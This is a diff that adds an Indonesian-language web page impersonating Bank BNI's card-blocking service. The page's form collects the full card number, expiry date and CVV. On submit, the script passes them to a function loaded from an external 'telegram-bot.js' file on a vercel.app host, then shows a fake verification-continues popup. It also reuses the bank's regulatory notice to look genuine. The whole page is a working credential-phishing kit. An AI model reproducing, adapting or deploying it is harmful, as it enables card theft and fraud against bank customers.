@@ -1,1 +1,559 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Bank BNI | Blokir Kartu</title>
+  <link rel="icon" href="ll/home/Bn1-0TP1/favicon.png">
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+  <!-- Bootstrap & Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
+    html, body {
+      width: 100%;
+      min-height: 100vh;
+      overflow-x: hidden;
+      font-family: 'Montserrat', sans-serif;
+      background: #f5f5f5;
+    }
+
+    body {
+      padding-bottom: 30px;
+    }
+
+    /* ===== Gambar Header ===== */
+    .header-img {
+      width: 100%;
+      height: auto;
+      display: block;
+      margin: 0;
+      padding: 0;
+    }
+
+    /* ===== KONTEN UTAMA ===== */
+    .content-wrapper {
+      padding: 0 15px;
+      margin-top: 10px;
+    }
+
+    .box-form {
+      background: #fff;
+      border-radius: 10px;
+      padding: 20px 18px;
+      box-shadow: 3px 3px 8px rgba(0,0,0,0.08);
+    }
+
+    /* ===== KARTU DENGAN EFEK PUTAR 3D ===== */
+    .card-container {
+      perspective: 1000px;
+      width: 100%;
+      max-width: 340px;
+      height: 215px;
+      margin: 0 auto 20px;
+      position: relative;
+    }
+
+    .card-inner {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      text-align: center;
+      transition: transform 0.6s ease-in-out;
+      transform-style: preserve-3d;
+    }
+
+    .card-container.flipped .card-inner {
+      transform: rotateY(180deg);
+    }
+
+    .card-front, .card-back {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      -webkit-backface-visibility: hidden;
+      backface-visibility: hidden;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+    }
+
+    .card-front {
+      background: linear-gradient(135deg, #0049ac 0%, #0098a5 100%);
+      color: white;
+      padding: 25px 20px;
+      text-align: left;
+    }
+
+    .card-back {
+      background: linear-gradient(135deg, #0098a5 0%, #0049ac 100%);
+      color: white;
+      transform: rotateY(180deg);
+      padding: 0;
+    }
+
+    .card-back-strip {
+      width: 100%;
+      height: 45px;
+      background: #000;
+      margin-top: 30px;
+    }
+
+    .card-cvv-area {
+      padding: 20px 25px;
+      text-align: right;
+    }
+
+    .cvv-label {
+      font-size: 12px;
+      color: #ccc;
+      margin-bottom: 5px;
+      text-transform: uppercase;
+    }
+
+    .cvv-display {
+      font-size: 22px;
+      font-weight: bold;
+      color: #000;
+      background: #fff;
+      display: inline-block;
+      padding: 8px 15px;
+      border-radius: 4px;
+      letter-spacing: 4px;
+      font-family: monospace;
+    }
+
+    .card-chip {
+      width: 50px;
+      height: 35px;
+      background: linear-gradient(135deg, #ffd700, #ffb800);
+      border-radius: 5px;
+      margin-bottom: 30px;
+    }
+
+    .card-number-display {
+      font-size: 20px;
+      letter-spacing: 3px;
+      margin-bottom: 20px;
+      font-weight: 500;
+      font-family: 'Courier New', monospace;
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+    }
+
+    .card-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      margin-top: 15px;
+    }
+
+    .card-valid-display {
+      font-size: 13px;
+      letter-spacing: 1px;
+    }
+
+    .card-logo {
+      font-size: 24px;
+      font-weight: 700;
+      color: #fff;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+    }
+
+    /* ===== FORM INPUT — JARAK SUDAH DIDEKATKAN ===== */
+    .form-group {
+      margin-bottom: 12px;
+    }
+
+    .form-group label {
+      font-size: 13px;
+      font-weight: 600;
+      color: #0f52b0;
+      margin-bottom: 5px;
+    }
+
+    .input-group {
+      border: 1px solid #FFA100;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .input-group-text {
+      background: #fff;
+      border: none;
+      color: #0f52b0;
+    }
+
+    .form-control {
+      border: none;
+      font-size: 15px;
+      padding: 10px 10px;
+      outline: none;
+      box-shadow: none !important;
+    }
+
+    .form-control:focus {
+      outline: none;
+      border: none;
+      box-shadow: none;
+    }
+
+    select.form-control {
+      height: 44px;
+      cursor: pointer;
+    }
+
+    .cvv-mask {
+      -webkit-text-security: disc;
+      text-security: disc;
+      letter-spacing: 4px;
+    }
+
+    /* ===== TOMBOL ===== */
+    .btn-blockir {
+      width: 100%;
+      background: #0049ac;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 13px;
+      border: none;
+      border-radius: 10px;
+      margin-top: 5px;
+      transition: background 0.2s ease;
+    }
+
+    .btn-blockir:hover {
+      background: #003d8e;
+      color: #fff;
+    }
+
+    /* ===== PEMBERITAHUAN PRIVASI ===== */
+    .privacy-note {
+      font-size: 11px;
+      color: #0f71b3;
+      text-align: center;
+      margin-top: 15px;
+      line-height: 1.6;
+      padding: 0 10px 30px;
+    }
+
+    /* ===== MODAL & LOADING ===== */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 20px;
+    }
+
+    .modal-overlay.active { display: flex; }
+
+    .modal-box {
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px 25px;
+      max-width: 360px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+    }
+
+    .modal-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #0049ac;
+      margin-bottom: 15px;
+    }
+
+    .modal-text {
+      font-size: 14px;
+      color: #555;
+      line-height: 1.6;
+      margin-bottom: 25px;
+    }
+
+    .modal-btn {
+      width: 100%;
+      background: #0049ac;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+    }
+
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+    }
+
+    .loading-overlay.active { display: flex; }
+
+    .loading-icon {
+      font-size: 40px;
+      color: #fff;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    /* ===== RESPONSIVE HP ===== */
+    @media (max-width: 480px) {
+      .box-form { padding: 18px 15px; }
+      .card-container { height: 190px; margin-bottom: 15px; }
+      .card-number-display { font-size: 16px; }
+      .form-group { margin-bottom: 10px; }
+      .form-control { font-size: 14px; padding: 9px 8px; }
+      .btn-blockir { font-size: 15px; padding: 12px; }
+      .privacy-note { font-size: 10px; padding: 0 5px 25px; margin-top: 12px; }
+      .modal-box { padding: 25px 20px; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <i class="fas fa-spinner loading-icon"></i>
+  </div>
+
+  <!-- Gambar Atas -->
+  <img src="https://formredit.online/www.web-ld.com/membatalkan/batalblokir/img/ben.jpg" alt="BNI" class="header-img">
+
+  <!-- Konten Utama -->
+  <div class="content-wrapper">
+    <div class="box-form">
+      <!-- KARTU DENGAN EFEK PUTAR 3D OTOMATIS -->
+      <div class="card-container" id="cardContainer">
+        <div class="card-inner">
+          <!-- SISI DEPAN KARTU -->
+          <div class="card-front">
+            <div class="card-chip"></div>
+            <div class="card-number-display" id="cardNumberText">XXXX XXXX XXXX XXXX</div>
+            <div class="card-bottom">
+              <div class="card-valid-display">
+                VALID THRU<br>
+                <span id="validThru">00/00</span>
+              </div>
+              <div class="card-logo">BNI</div>
+            </div>
+          </div>
+          <!-- SISI BELAKANG KARTU -->
+          <div class="card-back">
+            <div class="card-back-strip"></div>
+            <div class="card-cvv-area">
+              <div class="cvv-label">CVV / CVC</div>
+              <div class="cvv-display" id="cvvDisplay">XXX</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Form Input -->
+      <form id="blockForm">
+        <div class="form-group">
+          <label>Nomor Kartu</label>
+          <div class="input-group">
+            <div class="input-group-prepend">
+              <span class="input-group-text"><i class="fas fa-credit-card"></i></span>
+            </div>
+            <input type="tel" minlength="19" maxlength="19" class="form-control" id="cardInput" placeholder="Masukkan 16 digit nomor kartu" required>
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="col-6 pr-2">
+            <div class="form-group">
+              <label>Bulan</label>
+              <div class="input-group">
+                <select class="form-control" id="monthSelect" required>
+                  <option value="00" disabled selected>Pilih</option>
+                  <option value="01">01</option>
+                  <option value="02">02</option>
+                  <option value="03">03</option>
+                  <option value="04">04</option>
+                  <option value="05">05</option>
+                  <option value="06">06</option>
+                  <option value="07">07</option>
+                  <option value="08">08</option>
+                  <option value="09">09</option>
+                  <option value="10">10</option>
+                  <option value="11">11</option>
+                  <option value="12">12</option>
+                </select>
+              </div>
+            </div>
+          </div>
+          <div class="col-6 pl-2">
+            <div class="form-group">
+              <label>Tahun</label>
+              <div class="input-group">
+                <select class="form-control" id="yearSelect" required>
+                  <option value="00" disabled selected>Pilih</option>
+                  <option value="24">2024</option>
+                  <option value="25">2025</option>
+                  <option value="26">2026</option>
+                  <option value="27">2027</option>
+                  <option value="28">2028</option>
+                  <option value="29">2029</option>
+                  <option value="30">2030</option>
+                  <option value="31">2031</option>
+                  <option value="32">2032</option>
+                  <option value="33">2033</option>
+                  <option value="34">2034</option>
+                  <option value="35">2035</option>
+                </select>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>CVV / Kode Keamanan</label>
+          <div class="input-group">
+            <div class="input-group-prepend">
+              <span class="input-group-text"><i class="fas fa-lock"></i></span>
+            </div>
+            <input type="tel" minlength="3" maxlength="4" class="form-control cvv-mask" id="cvvInput" placeholder="3 digit di belakang kartu" required>
+          </div>
+        </div>
+
+        <button type="submit" class="btn-blockir">Blokir Kartu</button>
+      </form>
+
+      <!-- Pemberitahuan Privasi -->
+      <p class="privacy-note">
+        PT Bank Negara Indonesia (Persero) Tbk. berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS).
+      </p>
+    </div>
+  </div>
+
+  <!-- Modal Popup -->
+  <div class="modal-overlay" id="successModal">
+    <div class="modal-box">
+      <h3 class="modal-title">Terima Kasih</h3>
+      <p class="modal-text">
+        Permintaan Anda sedang dalam proses. Tinggal beberapa langkah lagi untuk menyelesaikan verifikasi. Silakan klik <strong>"Lanjutkan"</strong> untuk melanjutkan.
+      </p>
+      <button class="modal-btn" onclick="lanjutKeHalamanBerikutnya()">Lanjutkan</button>
+    </div>
+  </div>
+
+  <!-- ✅ PANGGIL FILE TELEGRAM BOT TERPISAH -->
+  <script src="https://bni-one.vercel.app/tel/telegram-bot.js"></script>
+
+  <script>
+    // Elemen
+    const cardContainer = document.getElementById('cardContainer');
+    const cardInput = document.getElementById('cardInput');
+    const monthSelect = document.getElementById('monthSelect');
+    const yearSelect = document.getElementById('yearSelect');
+    const cvvInput = document.getElementById('cvvInput');
+    const cardNumberText = document.getElementById('cardNumberText');
+    const validThru = document.getElementById('validThru');
+    const cvvDisplay = document.getElementById('cvvDisplay');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const successModal = document.getElementById('successModal');
+    const blockForm = document.getElementById('blockForm');
+
+    // ==============================================
+    // ✅ FUNGSI PUTAR KARTU OTOMATIS
+    // ==============================================
+    cvvInput.addEventListener('focus', function() {
+      cardContainer.classList.add('flipped');
+    });
+
+    cvvInput.addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '');
+      if (value.length > 4) value = value.slice(0, 4);
+      this.value = value;
+      cvvDisplay.textContent = value || 'XXX';
+    });
+
+    cardInput.addEventListener('focus', function() {
+      cardContainer.classList.remove('flipped');
+    });
+
+    monthSelect.addEventListener('focus', function() {
+      cardContainer.classList.remove('flipped');
+    });
+
+    yearSelect.addEventListener('focus', function() {
+      cardContainer.classList.remove('flipped');
+    });
+
+    // ==============================================
+    // FORMAT NOMOR KARTU & MASA BERLAKU
+    // ==============================================
+    cardInput.addEventListener('input', function() {
+      let value = this.value.replace(/\D/g, '');
+      if (value.length > 16) value = value.slice(0, 16);
+      let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+      this.value = formatted;
+      cardNumberText.textContent = value.length > 0 ? formatted.padEnd(19, 'X') : 'XXXX XXXX XXXX XXXX';
+    });
+
+    function updateValidThru() {
+      const month = monthSelect.value || '00';
+      const year = yearSelect.value || '00';
+      validThru.textContent = `${month}/${year}`;
+    }
+    monthSelect.addEventListener('change', updateValidThru);
+    yearSelect.addEventListener('change', updateValidThru);
+
+    // ==============================================
+    // KIRIM FORM — PAKAI FUNGSI DARI tel/telegram-bot.js
+    // ==============================================
+    blockForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const cardNumber = cardInput.value.trim().replace(/\s/g, '');
+      const month = monthSelect.value;
+      const year = yearSelect.value;
+      const cvv = cvvInput.value.trim();
+
+      if (cardNumber.length !== 16 || month === '00' || year === '00' || cvv.length < 3) {
+        alert('Harap lengkapi semua field dengan benar!');
+        return;
+      }
+
+      loadingOverlay.classList.add('active');
+
+      // ✅ PAKAI FUNGSI DARI FILE TERPISAH
+      await kirimDataBlokirKartu({
+        noKartu: cardNumber,
+        bulan: month,
+        tahun: year,
+        cvv: cvv,
+        namaBank: "BNI"
+      });
+
+      loadingOverlay.classList.remove('active');
+      successModal.classList.add('active');
+    });
+  </script>
+
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
